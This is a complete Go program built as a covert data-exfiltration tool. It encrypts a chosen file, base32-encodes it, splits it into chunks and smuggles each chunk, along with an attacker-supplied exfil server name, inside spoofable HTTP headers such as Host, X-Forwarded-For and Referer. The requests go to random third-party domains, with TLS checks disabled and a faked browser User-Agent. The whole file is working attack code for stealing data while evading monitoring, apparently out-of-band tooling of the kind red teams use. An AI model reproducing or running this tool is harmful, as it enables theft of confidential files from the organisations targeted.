package main

import (
  "crypto/rand"
  "crypto/sha1"
  "encoding/base32"
  "flag"
  "fmt"
  "crypto/tls"
//  "net/http/httputil"
  "log"
  "io/ioutil"
  "math/big"
  "net/http"
  "os"
  "strings"
  "golang.org/x/crypto/argon2"
  "golang.org/x/crypto/chacha20poly1305"
)

var (
  chunkSize   = 63
  domainsFile = "domains.txt"
  filePath    string
  uuidKey     string
  password    string
  exfil       string
  numTimes    int
  verbose     bool
)

func init() {
	flag.StringVar(&filePath, "f", "", "Path to the file to exfiltrate")
	flag.StringVar(&password, "p", "", "Password for encryption")
	flag.StringVar(&uuidKey, "u", "", "UUID key for the file")
	flag.StringVar(&exfil, "e", "", "Exfil server")
	flag.IntVar(&numTimes, "t", 1, "Number of times to send each chunk")
	flag.BoolVar(&verbose, "v", false, "Execute in verbose mode")
	flag.Parse()

	if filePath == "" || uuidKey == "" || exfil == "" {
		fmt.Println("Missing required arguments. Provide file path, UUID, and exfil domain.")
		flag.Usage()
		os.Exit(1)
	}
}

// generateKeyFromPassword uses Argon2 to derive a key from a given password.
func generateKeyFromPassword(password string, keySize int) ([]byte, []byte) {
  // Generate a random salt
  salt := make([]byte, 16)
  if _, err := rand.Read(salt); err != nil {
    log.Fatal(err)
  }

  // Derive a key using Argon2
  key := argon2.IDKey([]byte(password), salt, 1, 64*1024, 4, uint32(keySize))
  return key, salt
}

// Encrypt data using ChaCha20-Poly1305
func encryptData(data, key []byte) ([]byte, []byte, error)  {
//  key:= make([]byte, chacha20poly1305.KeySize)
  aead, err := chacha20poly1305.NewX(key)
  if err != nil {
    return nil, nil, err
  }
  nonce := make([]byte, aead.NonceSize())
  if _, err := rand.Read(nonce); err != nil {
    return nil, nil, err
  } 
  encrypted := aead.Seal(nil, nonce, data, nil)
  return nonce, encrypted, nil
}

func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunkID, totalChunks int, uuidKey string){
  url := fmt.Sprintf("http://%s/", domain)

  headerMap := map[string]string{
        "host": "Host",
        "xff": "X-Forwarded-For",
        "ref": "Referer",
        "cfcon": "CF-Connecting_IP", 
        "contact": "Contact",
		    "rip": "X-Real-IP", 
        "trip": "True-Client-IP", 
        "xclip": "X-Client-IP",
        "ff": "Forwarded",
	      "origip": "X-Originating-IP",
        "clip": "Client-IP", 
        "from": "From:",
  }

  // Create payload
  modifiedData := fmt.Sprintf("%s.%s.%d.%d.%s.%s", uuidKey, fileID, chunkID, totalChunks, data, exfil)

  tr := &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
  }

  client := &http.Client{
      Transport: tr,
      CheckRedirect: func(req *http.Request, via []*http.Request) error {
          return http.ErrUseLastResponse
      },
  }

  req, err := http.NewRequest("GET", url, nil)
  if err != nil {
    fmt.Printf("Failed to create request: %s\n", err)
    return
  }

  prefix = strings.TrimSpace(prefix)
	req.Header = http.Header{}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15")
  if headerName, ok := headerMap[prefix]; ok {
  req.Header.Set(headerName, modifiedData)
  } else {
  fmt.Printf("Invalid prefix provided: %s", prefix)
  return
  }
  
  req.Host = modifiedData


// Debugging
//reqDump, err := httputil.DumpRequestOut(req, true)
//if err != nil {
//    fmt.Printf("Error dumping request:", err)
//} else {
//    fmt.Printf(string(reqDump))
//}
  
  // Make the http request
  resp, err := client.Do(req)
  if err != nil {
      if verbose{
        fmt.Printf("Error getting response from: %s\n", err)
      }
    return
  }
  defer resp.Body.Close()

// Inform user of progress
	if verbose {
		fmt.Println("URL:", url)
		fmt.Println("Prefix:", prefix)
		fmt.Println("Headers:", req.Header)
   fmt.Println("Status Code:", resp.StatusCode)

	}
}

func sendFileChunks() {
  data, err := ioutil.ReadFile(filePath)
  if err != nil {
    fmt.Println("Error reading target file!")
    os.Exit(1)
  }
  
  // Generate encryption key from password and salt
  key, salt := generateKeyFromPassword(password, 32)

  // Encrypt the data
  nonce, encryptedData, err := encryptData(data, key)
  if err != nil {
    fmt.Println("Error encrypting data!")
    os.Exit(1)
  }

  // Combine salt, nonce, and ecrypted data before encoding
  finalData := append(salt, nonce...)
  finalData = append(finalData, encryptedData...)

  // Calculate SHA-1 hash of the original data
  hash := sha1.New()
  hash.Write(data)
  fileHash := fmt.Sprintf("%x", hash.Sum(nil))[:10]

  // base32 encode the encrypted data
  encodedData := base32.StdEncoding.EncodeToString(finalData)
  encodedData = strings.TrimRight(encodedData, "=")

  // Chunk the encoded data
  chunks := chunkString(encodedData, chunkSize)
  numChunks := len(chunks)

  // Read domains from file
  domains, err := ioutil.ReadFile(domainsFile)
  if err != nil {
    fmt.Printf("Domains file '%s' not found!\n", domainsFile)
    os.Exit(1)
  }

  //Cleaning the domain domainList
  domainList := cleanDomainList(strings.Split(string(domains), "\n"))
  if len(domainList) == 0 {
    fmt.Println("No valid domains available.")
    os.Exit(1)
  }

  // Chosse a random domain and split it
  for i := 0; i < numTimes; i++ {
    for idx, chunk := range chunks {
      chosenDomain := randomChoice(domainList)
      parts := strings.SplitN(chosenDomain, ".", 2)
      if len(parts) < 2 {
          fmt.Printf("Chosen domain: %s\n", chosenDomain)
          continue
      }
      prefix, targetDomain := parts[0], parts[1]

      sendChunkedRequest([]byte(chunk), targetDomain, prefix, exfil, fileHash, idx, numChunks, uuidKey)
    }
  }
}
// cleanDomainList removes empty strings and improperly formatted domains
func cleanDomainList(domains []string) []string {
  var cleaned []string
  for _, domain := range domains {
    domain = strings.TrimSpace(domain)
    domain = strings.ReplaceAll(domain, "\r", "")
    if domain != "" && strings.Contains(domain, ".") {
      cleaned = append(cleaned, domain)
    }
  }
  return cleaned
}

// Devides a string into chunks of a specified size
func chunkString(s string, size int) []string {
  var chunks []string
  for len(s) > size {
      chunks = append(chunks, s[:size])
      s = s[size:]
  }
  if len(s) > 0 {
      chunks = append(chunks, s)
  }
  return chunks
}

func randomChoice(lst []string) string {
  if len(lst) == 0 {
    return ""
  }
  n, err := rand.Int(rand.Reader, big.NewInt(int64(len(lst))))
  if err != nil{
    return ""
  }
  return lst[n.Int64()]
}

func main() {
  sendFileChunks()
}
